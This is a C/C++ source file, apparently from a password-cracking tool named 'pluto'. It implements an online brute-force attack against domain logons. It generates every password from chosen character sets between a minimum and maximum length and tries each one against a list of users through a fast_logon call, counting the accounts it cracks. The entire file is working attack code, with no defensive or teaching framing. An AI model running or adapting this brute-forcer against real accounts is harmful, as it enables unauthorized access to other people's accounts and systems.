#include  "include/pluto.h"
#include <ctype.h> // ispunct()

inline char* populateChars(BruteOptions *type) {
    char *chars = MAKE_STR;
    char i;
    int j = 0;

    if (type->lower) {
        for (i = 'a'; i <= 'z'; i++) {
            chars[j++] = i;
        }
    }

    if (type->upper) {
        for (i = 'A'; i <= 'Z'; i++) {
            chars[j++] = i;
        }
    }

    if (type->digit) {
        for (i = '0'; i <= '9'; i++) {
            chars[j++] = i;
        }
    }

    if (type->space) {
        chars[j++] = ' ';
    }

    if (type->punct) {
        for (i = 0x21; i < 0x7f; i++) {
            if (ispunct(i)) {
                chars[j++] = i;
            }
        }
    }

    chars[j] = 0; // End with \0
    return chars; // Note: Free when done
}

void brute_attack() {

    Iterator<char*> *user_it = opts->users;

    int tries = 0;
    int users = 0;
    int cracks = 0;
    bool success = false;

    char* user;
    char* pass = MAKE_STR_100; // Free
    char* domain = opts->domain;

    bool carry;

    int cur_len = opts->brute_opts->min_len; // Points to amount of chars, *not* the last index (last index: curlen -1)
    int max_len = opts->brute_opts->max_len;
    int i = 0; // Used as a char iterator

    char *chrs = populateChars(opts->brute_opts); // Free
    // strlen is slow, store it in a variable
    // http://cboard.cprogramming.com/brief-history-cprogramming-com/61652-just-say-no-strlen.html
    const int chrslen = strlen(chrs);

    countdown();

    // USER LOOP
    while (true) {

        // Next user
        if (!user_it->has_next()) {
            break;
        }
        user = user_it->next();
        users++;

        // Reset user
        cur_len = opts->brute_opts->min_len;
        for (int i = 0; i < cur_len; i++) {
            pass[i] = chrs[0];
        }
        pass[cur_len] = 0; // \0 terminator
        success = false;
        carry = false;

        // PASS LOOP
        while (true) {

            // Check enter
            if (enter_down()) {
                return;
            }

            // Update password
            i = 0; // Reset char iterator
            do {
                if (pass[i] == chrs[chrslen - 1]) { // Last char
                    carry = true;
                    pass[i] = chrs[0];
                } else {
                    carry = false;
                    pass[i] = *(strchr(chrs, pass[i]) + 1); // Next char
                    break;
                }
            } while (pass[++i]);

            // Add new char
            if (carry) {
                cur_len++;
                pass[cur_len - 1] = chrs[0];
                pass[cur_len] = 0;
                carry = false;

                if (cur_len > max_len) {
                    break;
                }
            }

            if (opts->filter_pass && !filter_pass(pass)) {
                continue;
            }

            // New try
            if (opts->limit_tries && tries >= opts->max_tries) {
                break;
            }
            tries++;

            // Try logon
            if (fast_logon(user, pass, domain)) {
                cracks++;
                success = true;
                break;
            }

            if (opts->verbose) {
                outln(string(user) + " > " + string(pass));
            }
        }

        // Out combo
        out_combo(user, pass, success);

        // Skip check
        if (success && opts->stop) {
            break;
        }
    }


    if (user_it->has_next()) {
        outfln("\nStopped. (%i tries, %i/%i cracked)", tries, cracks, users);
    } else {
        outfln("\nDone! (%i tries, %i/%i cracked)", tries, cracks, users);
    }

    user_it->close();
    free(chrs);
    free(pass);
    return;
}
